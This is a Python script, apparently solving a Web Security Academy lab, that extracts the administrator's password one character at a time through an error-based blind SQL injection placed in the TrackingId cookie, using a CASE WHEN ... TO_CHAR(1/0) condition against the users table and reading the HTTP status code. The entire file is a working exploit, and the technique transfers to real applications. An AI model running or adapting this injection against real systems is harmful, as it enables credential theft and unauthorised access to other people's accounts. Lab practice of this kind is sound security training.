import requests

url = "https://0a5f0097038ba5d280fe12fc00e3002a.web-security-academy.net/filter?category=abc"
character = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""
for num in range (1, 22):
    for char in character:
        headers = {
            "Host": "0a5f0097038ba5d280fe12fc00e3002a.web-security-academy.net",
            "Cookie" : f"TrackingId=xyz' UNION SELECT CASE WHEN (substr(password, 1, {num})='{password + char}') THEN NULL ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator'--",
            'Content-Length': '0',
            'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Priority': 'u=0, i'
        }
        response = requests.get(url=url, headers=headers)
        if (response.status_code == 200):
            password = password + char
            print("Password: " + password)

print("Username: administrator")
print("Password: " + password)
print("Please login to solve the lab!")